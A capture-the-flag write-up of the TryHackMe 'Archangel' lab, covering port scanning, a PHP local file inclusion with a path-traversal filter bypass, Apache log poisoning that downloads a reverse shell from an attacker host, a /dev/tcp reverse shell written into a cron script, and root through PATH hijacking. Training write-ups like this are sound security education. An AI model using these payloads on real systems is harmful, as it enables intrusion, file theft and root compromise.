------------------

### CTF: TRYHACKME
### Lab: Archangel

------------------

![image](https://github.com/user-attachments/assets/f7ae508e-590e-409a-92c9-355575db7c23)

-------------------

### RECONNAISSANCE

- Rustscan's output

      ❯ rustscan -a 10.10.221.102 -- -sC -sV
      .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
      | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
      | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
      `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
      The Modern Day Port Scanner.
      ________________________________________
      : https://discord.gg/GFrQsGy           :
      : https://github.com/RustScan/RustScan :
       --------------------------------------
      Real hackers hack time ⌛
      
      [~] The config file is expected to be at "/home/sensei/.rustscan.toml"
      [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
      [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
      Open 10.10.221.102:22
      Open 10.10.221.102:80
      [~] Starting Script(s)
      [>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")                                                                                        
                                                                                                                                                       
      [~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-26 13:23 EDT                                                                           
      NSE: Loaded 156 scripts for scanning.                                                                                                            
      NSE: Script Pre-scanning.                                                                                                                        
      NSE: Starting runlevel 1 (of 3) scan.                                                                                                            
      Initiating NSE at 13:23                                                                                                                          
      Completed NSE at 13:23, 0.00s elapsed                                                                                                            
      NSE: Starting runlevel 2 (of 3) scan.                                                                                                            
      Initiating NSE at 13:23                                                                                                                          
      Completed NSE at 13:23, 0.00s elapsed                                                                                                            
      NSE: Starting runlevel 3 (of 3) scan.                                                                                                            
      Initiating NSE at 13:23                                                                                                                          
      Completed NSE at 13:23, 0.00s elapsed                                                                                                            
      Initiating Ping Scan at 13:23                                                                                                                    
      Scanning 10.10.221.102 [2 ports]                                                                                                                 
      Completed Ping Scan at 13:23, 0.17s elapsed (1 total hosts)                                                                                      
      Initiating Connect Scan at 13:23                                                                                                                 
      Scanning mafialive.thm (10.10.221.102) [2 ports]
      Discovered open port 80/tcp on 10.10.221.102
      Discovered open port 22/tcp on 10.10.221.102
      Completed Connect Scan at 13:23, 0.21s elapsed (2 total ports)
      Initiating Service scan at 13:23
      Scanning 2 services on mafialive.thm (10.10.221.102)
      Completed Service scan at 13:23, 6.67s elapsed (2 services on 1 host)
      NSE: Script scanning 10.10.221.102.
      NSE: Starting runlevel 1 (of 3) scan.
      Initiating NSE at 13:23
      Completed NSE at 13:23, 6.83s elapsed
      NSE: Starting runlevel 2 (of 3) scan.
      Initiating NSE at 13:23
      Completed NSE at 13:23, 0.74s elapsed
      NSE: Starting runlevel 3 (of 3) scan.
      Initiating NSE at 13:23
      Completed NSE at 13:23, 0.01s elapsed
      Nmap scan report for mafialive.thm (10.10.221.102)
      Host is up, received syn-ack (0.18s latency).
      Scanned at 2024-08-26 13:23:04 EDT for 15s
      
      PORT   STATE SERVICE REASON  VERSION
      22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
      | ssh-hostkey: 
      |   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
      | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPrwb4vLZ/CJqefgxZMUh3zsubjXMLrKYpP8Oy5jNSRaZynNICWMQNfcuLZ2GZbR84iEQJrNqCFcbsgD+4OPyy0TXV1biJExck3OlriDBn3g9trxh6qcHTBKoUMM3CnEJtuaZ1ZPmmebbRGyrG03jzIow+w2updsJ3C0nkUxdSQ7FaNxwYOZ5S3X5XdLw2RXu/o130fs6qmFYYTm2qii6Ilf5EkyffeYRc8SbPpZKoEpT7TQ08VYEICier9ND408kGERHinsVtBDkaCec3XmWXkFsOJUdW4BYVhrD3M8JBvL1kPmReOnx8Q7JX2JpGDenXNOjEBS3BIX2vjj17Qo3V
      |   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
      | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKhhd/akQ2OLPa2ogtMy7V/GEqDyDz8IZZQ+266QEHke6vdC9papydu1wlbdtMVdOPx1S6zxA4CzyrcIwDQSiCg=
      |   256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
      |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBE3FV9PrmRlGbT2XSUjGvDjlWoA/7nPoHjcCXLer12O
      80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
      | http-robots.txt: 1 disallowed entry 
      |_/test.php
      | http-methods: 
      |_  Supported Methods: GET POST OPTIONS HEAD
      |_http-server-header: Apache/2.4.29 (Ubuntu)
      |_http-title: Site doesn't have a title (text/html).
      Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

- I discovered a possible domain while checking the index page.

![image](https://github.com/user-attachments/assets/5afc78d2-8d3c-4519-b99f-df38e104e459)

- The domain `mafialive.thm` is up. Don't forget to add to `/etc/hosts`

![image](https://github.com/user-attachments/assets/10a89299-0874-4ac1-be48-20c0a22dc7ac)

- FFUF's Fuzzing results for `mafialive.thm`

![image](https://github.com/user-attachments/assets/f189b5df-15e5-48d3-8c67-55e5c6385f7a)

- Checking `robots.txt` shows an hidden test.php

![image](https://github.com/user-attachments/assets/21682395-84c1-4593-bfa9-938b25199da8)

- Test.php

![image](https://github.com/user-attachments/assets/796d8211-a6b5-4b9c-b6df-65240e08382f)

------------------------

### Local File Inclusion

- I checked the source code and noticed that the `view` query allows us to read files

![image](https://github.com/user-attachments/assets/c789dc64-80d3-4587-b548-4fa70d59a9fc)

- The page filters some characters

![image](https://github.com/user-attachments/assets/bdf74ebb-31f3-47e5-9c78-14e5f7715281)

- I used  `php://filter/convert.base64-encode/resource=[filepath]` filter to read files in base64 format.The `include()` allows an attacker to read files
in php but we need to read the code to bypass the filters.We can read the `test.php` directly, php automatically renders or execute the code.
With the aid of the encoding filter,we can pass it out in encoded form instead of php. The filter above renders the file in base64 format.

![image](https://github.com/user-attachments/assets/f1c8f735-6a4b-4252-93df-7ede63cd3d86)

------------------------

### Filters bypass

- Code:

      <!DOCTYPE HTML>
      <html>
      
      <head>
          <title>INCLUDE</title>
          <h1>Test Page. Not to be Deployed</h1>
       
          </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
              <?php
      
                  //FLAG: thm{explo1t1ng_lf1}
      
                  function containsStr($str, $substr) {
                      return strpos($str, $substr) !== false;
                  }
                  if(isset($_GET["view"])){
                  if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
                      include $_GET['view'];
                  }else{
      
                      echo 'Sorry, Thats not allowed';
                  }
              }
              ?>
          </div>
      </body>
      
      </html>

- Filter

      if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing'))

  - `!containsStr($_GET['view'], '../..')` checks if `../..` is in the parameter view and the other `containsStr($_GET['view'], '/var/www/html/development_testing')` checks if directory "/var/www/html/development_testing" is in the file path.

- I bypassed it by adding `./` after `../`.The characters `./` tells linux to check the current directory for `..` which in turns go up a directory.Example:

 ![image](https://github.com/user-attachments/assets/4ca6405e-8777-4757-a3a6-2a3e7aa1b37a)

- In the case of the the target,we have to go up 4 directories to read sensitive files.The payload below will read the `/etc/passwd` file.

  Payload-:```/var/www/html/development_testing/.././.././.././.././.././etc/passwd```

![image](https://github.com/user-attachments/assets/c43c51a9-43c8-4c1f-8880-86061e2d247c)

-----------------------------

### Poisoning apache log gain RCE

- Apache server's log can be found in `/var/log/apache2/access.log`.

![image](https://github.com/user-attachments/assets/1263e347-cbee-485a-baff-86f313caae88)

- Adding php code the `User-Agent` header will reflect in the log file and execute as php code. I got an idea to exploit it from this [github's repo](https://github.com/RoqueNight/LFI---RCE-Cheat-Sheet)

- The code `<?php file_put_contents('shell.php',file_get_contents('http://<local_ip>:<PORT>/shell-php-rev.php')) ?>` uses the file_get_contents() to get the content of the file hosted on our http server.The file's contents is written to shell.php. The file path should be `/var/www/html/development_testing/shell.php` because we have write access to `development_testing`.

![image](https://github.com/user-attachments/assets/65656a09-8f1f-42c0-9b8b-6db48a95b49d)

- Shell access

![image](https://github.com/user-attachments/assets/45aa405e-aeb6-4026-b19b-4589acdbe6af)

------------------------

### Initial Foothold

- Reverse shell as `www-data`

![image](https://github.com/user-attachments/assets/89fa8faf-4630-41de-bd32-99a0092a9765)

-------------------------

### Pivotiing to user `archangel`

- File `/etc/crontab` shows that user `archangel` has a cron job that runs a script `/opt/helloworld.sh`

![image](https://github.com/user-attachments/assets/aa87a41f-d0bb-4836-a89c-e46e186f0134)

- We have write access to the file and can add reverse shell bash code to it.

  Payload-:```echo -ne "#! /bin/bash\nbash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'" > /opt/helloworld.sh```

- Shell as `archangel`

![image](https://github.com/user-attachments/assets/20fabd35-999b-4599-9946-06a7666efb1a)

-----------------------------

### Privesc with PATH HIJACKING

- I ran `find / -type f -perm -u=s 2</dev/null` to check for suid binaries and discovered a root binary with suid permission in archangel's directory.

![image](https://github.com/user-attachments/assets/811acffa-8661-4c3a-bb9d-1757ee26de7b)

- Running strings on the binary shows it uses the `cp` binary to copy files but the absolute path is not stated, we can hijack the path and run a malicious as and execute root commands.

![image](https://github.com/user-attachments/assets/84a423af-d103-432e-b33c-a860f1746c29)

- I added `/tmp` to the path variable, so I can create a malicious binary in `/tmp` and gain root.

  Code to create mailicious file-:```echo -ne "#! /usr/bin/env python3\nimport os\nos.setuid(0)\nos.setgid(0)\nos.system('bash -p')" > /tmp/cp```

![image](https://github.com/user-attachments/assets/2d823ab6-1d46-4656-bb29-84465c05296b)

- Root shell

![image](https://github.com/user-attachments/assets/afe25f5c-b6dc-45ab-a930-cc94f38eda0a)

----------------------

### REFERENCES:

- [LFI-Bypass](https://null-byte.wonderhowto.com/how-to/beat-lfi-restrictions-with-advanced-techniques-0198048/)
- [LFI2RCE](https://github.com/RoqueNight/LFI---RCE-Cheat-Sheet)
  
-----------------------

### THANKS FOR READING !!!

-----------------------




















